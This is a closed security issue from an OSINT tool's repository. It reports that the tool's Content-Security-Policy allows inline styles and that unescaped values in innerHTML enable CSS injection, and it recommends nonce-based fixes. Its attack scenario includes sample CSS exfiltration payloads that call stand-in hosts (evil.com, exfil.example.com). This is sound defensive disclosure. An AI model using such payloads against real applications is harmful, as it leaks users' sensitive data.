# Issue #41: CSP includes style-src 'unsafe-inline', enabling CSS injection and data exfiltration from intelligence reports

- **State:** closed
- **Created:** 2026-06-08T11:43:06Z
- **Updated:** 2026-06-29T16:18:07Z
- **Labels:** None

---

## Summary
The Content-Security-Policy header defined in `estorides_core/web_security.py` includes `style-src 'self' 'unsafe-inline'`. The `'unsafe-inline'` directive for styles allows any inline `<style>` block or `style=` attribute to execute, defeating CSS injection mitigations. When combined with unescaped entity type values in `innerHTML` template literals (see the related XSS issue), an attacker can inject arbitrary CSS including CSS exfiltration payloads that leak sensitive text content without JavaScript.

## Evidence
`estorides_core/web_security.py` line 61:
```python
csp_policy: str = (
    "default-src 'self'; "
    "script-src 'self' https://unpkg.com https://cdn.jsdelivr.net; "
    "style-src 'self' 'unsafe-inline' https://unpkg.com; "   # <-- unsafe-inline
    "img-src 'self' data: https:; "
    "connect-src 'self'; "
    "frame-ancestors 'none'; "
    "base-uri 'self'; "
    "form-action 'self'"
)
```

`static/js/estorides.js` line 1106 shows inline styles already set on elements:
```js
row.innerHTML = `<span style="color:${colorForKind(e.kind)}">${e.type}</span>...`
```

The `colorForKind()` return value also flows into a `style=` attribute without sanitisation.

## Why this matters
CSS injection enables:
1. **Data exfiltration**: CSS attribute selectors can detect the presence of specific text and make network requests via `background-image: url(https://evil.com/?data=...)`, leaking case IDs, query targets, or user agent fingerprints.
2. **UI redressing**: Injected styles can overlay elements, move buttons, or make the interface misleading (clickjacking-adjacent).
3. **Amplifying XSS**: If the script-src CSP is later weakened, `unsafe-inline` in styles is already set as precedent.

## Attack or failure scenario
1. A malicious OSINT source injects `<span style="position:fixed;top:0;left:0;width:100%;height:100%;background:url(https://exfil.example.com/?p=` as the entity type.
2. The `unsafe-inline` CSP allows this style to execute.
3. The exfiltration URL receives a request whenever the operator views the results page.

## Root cause
The `'unsafe-inline'` directive was added for developer convenience (inline styles are used extensively in the D3.js graph rendering and in the estorides.css). Migrating to nonces or hashes was deferred.

## Recommended fix
1. Audit all inline styles used by the UI. Move them to `estorides.css` class rules.
2. Replace dynamic inline `style=` attributes in `estorides.js` with CSS class toggles or CSS custom properties.
3. Remove `'unsafe-inline'` from `style-src` in the CSP policy.
4. If some inline styles are truly unavoidable, use a nonce-based CSP: generate a cryptographic nonce per request and add it to both the CSP header and the inline `<style>` tags.
5. Ensure `colorForKind()` output and any other value interpolated into `style=` attributes is validated to be a safe CSS color value (hex or named color only).

## Acceptance criteria
- `style-src` in the default CSP no longer contains `'unsafe-inline'`.
- All inline styles in `index.html` and `estorides.js` are migrated to external CSS classes or are nonce-protected.
- A CSP evaluation tool (e.g. Google CSP Evaluator) rates the resulting policy as no unsafe directives.
- A test verifies the CSP header is present and does not contain `unsafe-inline`.

## Suggested labels
security, technical-debt

## Priority
P2

## Severity
High — `'unsafe-inline'` in style-src enables CSS injection-based data exfiltration from OSINT result pages, which can contain sensitive investigative targets and intelligence.

## Confidence
Confirmed — the `'unsafe-inline'` directive is present in the hardcoded CSP policy.
